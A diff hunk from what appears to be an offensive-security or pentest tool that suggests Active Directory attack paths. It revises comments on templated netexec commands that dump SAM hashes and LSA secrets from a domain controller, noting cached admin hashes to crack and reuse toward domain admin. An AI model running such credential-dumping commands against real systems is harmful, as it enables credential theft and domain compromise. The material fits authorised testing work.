@@ -988,9 +988,10 @@ def run(report, store, ui=None):
                         f"they cannot DCSync. netexec drives the same "
                         f"registry-hive-save primitive as a one-liner:",
                         f"netexec smb {_dc_ac} {_nxc_auth} --sam   "
-                        f"# local machine account NT hashes",
+                        f"# LOCAL SAM users (Administrator/Guest local NT hashes)",
                         f"netexec smb {_dc_ac} {_nxc_auth} --lsa   "
-                        f"# LSA secrets incl. cached domain krbtgt -> R-GOLDEN",
+                        f"# LSA secrets: $MACHINE.ACC, _SC_* service pw, "
+                        f"DCC2($administrator) - crack + reuse -> DA cascade",
                     ], src=best_src, line=best_line))
             else:
                 chains.append(Chain("R-ADMIN-CRED", "already-DA cred",
